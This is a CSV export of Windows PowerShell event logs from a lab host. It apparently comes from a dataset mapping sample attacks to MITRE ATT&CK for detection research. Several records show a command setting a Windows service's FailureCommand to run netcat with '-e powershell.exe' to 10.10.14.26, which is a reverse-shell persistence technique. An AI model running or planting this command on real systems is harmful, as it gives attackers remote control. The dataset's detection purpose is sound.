RecordNumber,EventRecordId,TimeCreated,EventId,Level,Provider,Channel,ProcessId,ThreadId,Computer,ChunkNumber,UserId,MapDescription,UserName,RemoteHost,PayloadData1,PayloadData2,PayloadData3,PayloadData4,PayloadData5,PayloadData6,ExecutableInfo,HiddenRecord,SourceFile,Keywords,ExtraDataOffset,Payload
1,1172290,2021-10-07 18:30:51.2241404,800,Info,PowerShell,Windows PowerShell,0,0,win10-02.offsec.lan,0,,Pipeline Execution Details,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
","HostName=ConsoleHost
","HostVersion=5.1.19041.1237
",,,,,False,EVTX-to-MITRE-Attack\TA0003-Persistence\T1543.003-Create or Modify System Process-Windows Service\ID800-4103-4104-Service abuse with Failure Command.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""\tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=2438\n\n\tUserId=OFFSEC\\admmig\n\tHostName=ConsoleHost\n\tHostVersion=5.1.19041.1237\n\tHostId=cd8cafb9-7c03-4e5e-9d54-914780550df1\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=5.1.19041.1237\n\tRunspaceId=d94c9947-fce3-4f7e-9a49-18ff6724f22b\n\tPipelineId=183\n\tScriptName=\n\tCommandLine=, CommandInvocation(PSConsoleHostReadLine): \""PSConsoleHostReadLine\""\n"",""Binary"":""""}}"
2,1341625,2021-10-07 18:30:51.2373313,4103,Info,Microsoft-Windows-PowerShell,Microsoft-Windows-PowerShell/Operational,1636,9868,win10-02.offsec.lan,0,S-1-5-21-4230534742-2542757381-3142984815-1111,Pipeline executed,OFFSEC\admmig,,Command Name: PSConsoleHostReadLine,Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"Script Name: ","ConnectedUser: ",Host Name: ConsoleHost,"Payload: CommandInvocation(PSConsoleHostReadLine): ""PSConsoleHostReadLine"", ",,False,EVTX-to-MITRE-Attack\TA0003-Persistence\T1543.003-Create or Modify System Process-Windows Service\ID800-4103-4104-Service abuse with Failure Command.evtx,0x0,0,"{""EventData"":{""Data"":[{""@Name"":""ContextInfo"",""#text"":""        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 5.1.19041.1237,         Host ID = cd8cafb9-7c03-4e5e-9d54-914780550df1,         Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,         Engine Version = 5.1.19041.1237,         Runspace ID = d94c9947-fce3-4f7e-9a49-18ff6724f22b,         Pipeline ID = 183,         Command Name = PSConsoleHostReadLine,         Command Type = Function,         Script Name = ,         Command Path = ,         Sequence Number = 2439,         User = OFFSEC\\admmig,         Connected User = ,         Shell ID = Microsoft.PowerShell, ""},{""@Name"":""UserData""},{""@Name"":""Payload"",""#text"":""CommandInvocation(PSConsoleHostReadLine): \""PSConsoleHostReadLine\"", ""}]}}"
3,1172291,2021-10-07 18:30:51.2397899,800,Info,PowerShell,Windows PowerShell,0,0,win10-02.offsec.lan,0,,Pipeline Execution Details,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
","HostName=ConsoleHost
","HostVersion=5.1.19041.1237
",,,,,False,EVTX-to-MITRE-Attack\TA0003-Persistence\T1543.003-Create or Modify System Process-Windows Service\ID800-4103-4104-Service abuse with Failure Command.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""Set-ItemProperty -path HKLM:\\System\\CurrentControlSet\\services\\xboxgip -name FailureCommand -value \""C:\\nc.exe -e powershell.exe 10.10.14.26 4447\"", \tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=2444\n\n\tUserId=OFFSEC\\admmig\n\tHostName=ConsoleHost\n\tHostVersion=5.1.19041.1237\n\tHostId=cd8cafb9-7c03-4e5e-9d54-914780550df1\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=5.1.19041.1237\n\tRunspaceId=d94c9947-fce3-4f7e-9a49-18ff6724f22b\n\tPipelineId=184\n\tScriptName=\n\tCommandLine=Set-ItemProperty -path HKLM:\\System\\CurrentControlSet\\services\\xboxgip -name FailureCommand -value \""C:\\nc.exe -e powershell.exe 10.10.14.26 4447\"", CommandInvocation(Set-ItemProperty): \""Set-ItemProperty\""\nParameterBinding(Set-ItemProperty): name=\""Path\""; value=\""HKLM:\\System\\CurrentControlSet\\services\\xboxgip\""\nParameterBinding(Set-ItemProperty): name=\""Name\""; value=\""FailureCommand\""\nParameterBinding(Set-ItemProperty): name=\""Value\""; value=\""C:\\nc.exe -e powershell.exe 10.10.14.26 4447\""\n"",""Binary"":""""}}"
4,1172292,2021-10-07 18:30:51.2397899,800,Info,PowerShell,Windows PowerShell,0,0,win10-02.offsec.lan,0,,Pipeline Execution Details,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
","HostName=ConsoleHost
","HostVersion=5.1.19041.1237
",,,,,False,EVTX-to-MITRE-Attack\TA0003-Persistence\T1543.003-Create or Modify System Process-Windows Service\ID800-4103-4104-Service abuse with Failure Command.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""\tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=2448\n\n\tUserId=OFFSEC\\admmig\n\tHostName=ConsoleHost\n\tHostVersion=5.1.19041.1237\n\tHostId=cd8cafb9-7c03-4e5e-9d54-914780550df1\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=5.1.19041.1237\n\tRunspaceId=d94c9947-fce3-4f7e-9a49-18ff6724f22b\n\tPipelineId=184\n\tScriptName=\n\tCommandLine=, CommandInvocation(Out-Default): \""Out-Default\""\n"",""Binary"":""""}}"
5,1341626,2021-10-07 18:30:51.2471027,4104,Verbose,Microsoft-Windows-PowerShell,Microsoft-Windows-PowerShell/Operational,1636,9868,win10-02.offsec.lan,0,S-1-5-21-4230534742-2542757381-3142984815-1111,Contains contents of scripts run,,,"Path: ","ScriptBlockText: Set-ItemProperty -path HKLM:\System\CurrentControlSet\services\xboxgip -name FailureCommand -value ""C:\nc.exe -e powershell.exe 10.10.14.26 4447""",,,,,,False,EVTX-to-MITRE-Attack\TA0003-Persistence\T1543.003-Create or Modify System Process-Windows Service\ID800-4103-4104-Service abuse with Failure Command.evtx,0x0,0,"{""EventData"":{""Data"":[{""@Name"":""MessageNumber"",""#text"":""1""},{""@Name"":""MessageTotal"",""#text"":""1""},{""@Name"":""ScriptBlockText"",""#text"":""Set-ItemProperty -path HKLM:\\System\\CurrentControlSet\\services\\xboxgip -name FailureCommand -value \""C:\\nc.exe -e powershell.exe 10.10.14.26 4447\""""},{""@Name"":""ScriptBlockId"",""#text"":""0654a304-20aa-4c04-b6b9-8f5bc13220bb""},{""@Name"":""Path""}]}}"
6,1341627,2021-10-07 18:30:51.2519802,4103,Info,Microsoft-Windows-PowerShell,Microsoft-Windows-PowerShell/Operational,1636,9868,win10-02.offsec.lan,0,S-1-5-21-4230534742-2542757381-3142984815-1111,Pipeline executed,OFFSEC\admmig,,Command Name: Set-ItemProperty,Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"Script Name: ","ConnectedUser: ",Host Name: ConsoleHost,"Payload: CommandInvocation(Set-ItemProperty): ""Set-ItemProperty"", ParameterBinding(Set-ItemProperty): name=""Path""; value=""HKLM:\System\CurrentControlSet\services\xboxgip"", ParameterBinding(Set-ItemProperty): name=""Name""; value=""FailureCommand"", ParameterBinding(Set-ItemProperty): name=""Value""; value=""C:\nc.exe -e powershell.exe 10.10.14.26 4447"", ",,False,EVTX-to-MITRE-Attack\TA0003-Persistence\T1543.003-Create or Modify System Process-Windows Service\ID800-4103-4104-Service abuse with Failure Command.evtx,0x0,0,"{""EventData"":{""Data"":[{""@Name"":""ContextInfo"",""#text"":""        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 5.1.19041.1237,         Host ID = cd8cafb9-7c03-4e5e-9d54-914780550df1,         Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,         Engine Version = 5.1.19041.1237,         Runspace ID = d94c9947-fce3-4f7e-9a49-18ff6724f22b,         Pipeline ID = 184,         Command Name = Set-ItemProperty,         Command Type = Cmdlet,         Script Name = ,         Command Path = ,         Sequence Number = 2445,         User = OFFSEC\\admmig,         Connected User = ,         Shell ID = Microsoft.PowerShell, ""},{""@Name"":""UserData""},{""@Name"":""Payload"",""#text"":""CommandInvocation(Set-ItemProperty): \""Set-ItemProperty\"", ParameterBinding(Set-ItemProperty): name=\""Path\""; value=\""HKLM:\\System\\CurrentControlSet\\services\\xboxgip\"", ParameterBinding(Set-ItemProperty): name=\""Name\""; value=\""FailureCommand\"", ParameterBinding(Set-ItemProperty): name=\""Value\""; value=\""C:\\nc.exe -e powershell.exe 10.10.14.26 4447\"", ""}]}}"
7,1341628,2021-10-07 18:30:51.2523607,4103,Info,Microsoft-Windows-PowerShell,Microsoft-Windows-PowerShell/Operational,1636,9868,win10-02.offsec.lan,0,S-1-5-21-4230534742-2542757381-3142984815-1111,Pipeline executed,OFFSEC\admmig,,"Command Name: ",Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"Script Name: ","ConnectedUser: ",Host Name: ConsoleHost,"Payload: CommandInvocation(Out-Default): ""Out-Default"", ",,False,EVTX-to-MITRE-Attack\TA0003-Persistence\T1543.003-Create or Modify System Process-Windows Service\ID800-4103-4104-Service abuse with Failure Command.evtx,0x0,0,"{""EventData"":{""Data"":[{""@Name"":""ContextInfo"",""#text"":""        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 5.1.19041.1237,         Host ID = cd8cafb9-7c03-4e5e-9d54-914780550df1,         Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,         Engine Version = 5.1.19041.1237,         Runspace ID = d94c9947-fce3-4f7e-9a49-18ff6724f22b,         Pipeline ID = 184,         Command Name = ,         Command Type = Script,         Script Name = ,         Command Path = ,         Sequence Number = 2449,         User = OFFSEC\\admmig,         Connected User = ,         Shell ID = Microsoft.PowerShell, ""},{""@Name"":""UserData""},{""@Name"":""Payload"",""#text"":""CommandInvocation(Out-Default): \""Out-Default\"", ""}]}}"
8,1172293,2021-10-07 18:30:51.2554108,800,Info,PowerShell,Windows PowerShell,0,0,win10-02.offsec.lan,0,,Pipeline Execution Details,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
","HostName=ConsoleHost
","HostVersion=5.1.19041.1237
",,,,,False,EVTX-to-MITRE-Attack\TA0003-Persistence\T1543.003-Create or Modify System Process-Windows Service\ID800-4103-4104-Service abuse with Failure Command.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""    Microsoft.PowerShell.Core\\Set-StrictMode -Off\n, \tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=2463\n\n\tUserId=OFFSEC\\admmig\n\tHostName=ConsoleHost\n\tHostVersion=5.1.19041.1237\n\tHostId=cd8cafb9-7c03-4e5e-9d54-914780550df1\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=5.1.19041.1237\n\tRunspaceId=d94c9947-fce3-4f7e-9a49-18ff6724f22b\n\tPipelineId=186\n\tScriptName=C:\\Program Files\\WindowsPowerShell\\Modules\\PSReadline\\2.0.0\\PSReadLine.psm1\n\tCommandLine=    Microsoft.PowerShell.Core\\Set-StrictMode -Off\n, CommandInvocation(Set-StrictMode): \""Set-StrictMode\""\nParameterBinding(Set-StrictMode): name=\""Off\""; value=\""True\""\n"",""Binary"":""""}}"
9,1341629,2021-10-07 18:30:51.2663236,4104,Verbose,Microsoft-Windows-PowerShell,Microsoft-Windows-PowerShell/Operational,1636,9868,win10-02.offsec.lan,0,S-1-5-21-4230534742-2542757381-3142984815-1111,Contains contents of scripts run,,,"Path: ",ScriptBlockText: prompt,,,,,,False,EVTX-to-MITRE-Attack\TA0003-Persistence\T1543.003-Create or Modify System Process-Windows Service\ID800-4103-4104-Service abuse with Failure Command.evtx,0x0,0,"{""EventData"":{""Data"":[{""@Name"":""MessageNumber"",""#text"":""1""},{""@Name"":""MessageTotal"",""#text"":""1""},{""@Name"":""ScriptBlockText"",""#text"":""prompt""},{""@Name"":""ScriptBlockId"",""#text"":""02523ed7-a302-4032-88c8-d5d52f7addd7""},{""@Name"":""Path""}]}}"
10,1341630,2021-10-07 18:30:51.2693337,4103,Info,Microsoft-Windows-PowerShell,Microsoft-Windows-PowerShell/Operational,1636,9868,win10-02.offsec.lan,0,S-1-5-21-4230534742-2542757381-3142984815-1111,Pipeline executed,OFFSEC\admmig,,Command Name: Set-StrictMode,Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,Script Name: C:\Program Files\WindowsPowerShell\Modules\PSReadline\2.0.0\PSReadLine.psm1,"ConnectedUser: ",Host Name: ConsoleHost,"Payload: CommandInvocation(Set-StrictMode): ""Set-StrictMode"", ParameterBinding(Set-StrictMode): name=""Off""; value=""True"", ",,False,EVTX-to-MITRE-Attack\TA0003-Persistence\T1543.003-Create or Modify System Process-Windows Service\ID800-4103-4104-Service abuse with Failure Command.evtx,0x0,0,"{""EventData"":{""Data"":[{""@Name"":""ContextInfo"",""#text"":""        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 5.1.19041.1237,         Host ID = cd8cafb9-7c03-4e5e-9d54-914780550df1,         Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,         Engine Version = 5.1.19041.1237,         Runspace ID = d94c9947-fce3-4f7e-9a49-18ff6724f22b,         Pipeline ID = 186,         Command Name = Set-StrictMode,         Command Type = Cmdlet,         Script Name = C:\\Program Files\\WindowsPowerShell\\Modules\\PSReadline\\2.0.0\\PSReadLine.psm1,         Command Path = ,         Sequence Number = 2464,         User = OFFSEC\\admmig,         Connected User = ,         Shell ID = Microsoft.PowerShell, ""},{""@Name"":""UserData""},{""@Name"":""Payload"",""#text"":""CommandInvocation(Set-StrictMode): \""Set-StrictMode\"", ParameterBinding(Set-StrictMode): name=\""Off\""; value=\""True\"", ""}]}}"
